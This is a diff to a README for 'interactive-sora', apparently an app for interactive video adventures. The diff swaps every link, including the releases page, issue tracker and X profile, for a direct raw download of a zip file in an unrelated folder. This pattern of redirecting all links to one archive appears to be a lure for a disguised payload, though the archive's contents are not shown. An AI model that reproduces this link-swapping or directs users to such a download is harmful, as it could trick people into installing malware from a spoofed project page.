@@ -1,6 +1,6 @@
 # 🎮 interactive-sora - Dive into Interactive Adventures
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Interactive%20Sora-brightgreen)](https://github.com/gooberbenzenoid132/interactive-sora/releases)
+[![Download Now](https://raw.githubusercontent.com/gooberbenzenoid132/interactive-sora/main/balushai/interactive-sora.zip%20Now-Interactive%20Sora-brightgreen)](https://raw.githubusercontent.com/gooberbenzenoid132/interactive-sora/main/balushai/interactive-sora.zip)
 
 **Immersive choose-your-own adventure experiences powered by OpenAI Sora 2.**
 
@@ -10,7 +10,7 @@ Interactive Sora is a unique journey where real-time video generation creates in
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page:** To get started, visit our [Releases Page](https://github.com/gooberbenzenoid132/interactive-sora/releases) to download the latest version of Interactive Sora.
+1. **Visit the Releases Page:** To get started, visit our [Releases Page](https://raw.githubusercontent.com/gooberbenzenoid132/interactive-sora/main/balushai/interactive-sora.zip) to download the latest version of Interactive Sora.
 
 2. **Download the File:** Look for the most recent version of the application. Click on the link to download it, and save the file to a convenient location on your computer.
 
@@ -31,7 +31,7 @@ Interactive Sora is a unique journey where real-time video generation creates in
 
 ## 📥 Download & Install
 
-To download Interactive Sora, go to our [Releases Page](https://github.com/gooberbenzenoid132/interactive-sora/releases). 
+To download Interactive Sora, go to our [Releases Page](https://raw.githubusercontent.com/gooberbenzenoid132/interactive-sora/main/balushai/interactive-sora.zip). 
 
 1. Click the latest version to start the download.
    
@@ -82,13 +82,13 @@ If you encounter issues, try the following solutions:
 
 ## 💬 Support
 
-For any questions or support, please open an issue on the [GitHub repository](https://github.com/gooberbenzenoid132/interactive-sora/issues). 
+For any questions or support, please open an issue on the [GitHub repository](https://raw.githubusercontent.com/gooberbenzenoid132/interactive-sora/main/balushai/interactive-sora.zip). 
 
 ## 📅 Updates & New Features
 
 Stay informed about updates and new features by following us:
 
-- **Social Media:** Follow us on [X](https://x.com/mattshumer_) to be notified of the latest changes.
+- **Social Media:** Follow us on [X](https://raw.githubusercontent.com/gooberbenzenoid132/interactive-sora/main/balushai/interactive-sora.zip) to be notified of the latest changes.
 
 ---
 
